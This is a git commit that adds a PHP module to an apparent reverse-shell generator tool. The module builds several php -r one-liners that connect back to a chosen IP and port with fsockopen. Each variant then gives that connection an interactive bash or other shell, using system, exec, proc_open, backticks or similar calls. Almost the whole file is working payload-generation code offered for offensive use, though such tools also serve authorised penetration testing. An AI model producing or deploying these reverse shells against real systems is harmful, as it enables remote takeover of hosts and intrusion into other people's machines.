424b46aff5d177cc1f8e02e279b16fcd74a1914b
smith <smith.nguyenhoangthanh@gmail.com>
2020-12-28 16:59:39 +0700

    add PHP revershell

---
+++ shellgen/modules/multi/php.py
@@ -0,0 +1,43 @@
+from ogabog.cores import plugin, const
+
+
+class ReverseTCP(plugin.ReverseShell):
+    def __init__(self):
+        super().__init__()
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.add_args(
+            "--exec",
+            default="system",
+            choices=[
+                "exec",
+                "shell_exec",
+                "system",
+                "passthru",
+                "popen",
+                "back_quote",
+                "proc_open"
+            ]
+        )
+        self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
+
+    def make_shell(self):
+        if self.args.exec == "back_quote":
+            self.shell = """php -r '$sock=fsockopen("{}",{});`{} -i <&3 >&3 2>&3`;'""".format(self.args.ip,
+                                                                                              self.args.port,
+                                                                                              self.args.shell)
+        elif self.args.exec == "proc_open":
+            self.shell = """php -r '$sock=fsockopen("{}",{});$proc=proc_open("{} -i", array(0=>$sock, 1=>$sock, 
+            2=>$sock),$pipes);'""".format(
+                self.args.ip,
+                self.args.port,
+                self.args.shell)
+        else:
+            self.shell = """php -r '$sock=fsockopen("{}",{});{}("{} -i <&3 >&3 2>&3");'""".format(self.args.ip,
+                                                                                                  self.args.port,
+                                                                                                  self.args.exec,
+                                                                                                  self.args.shell)
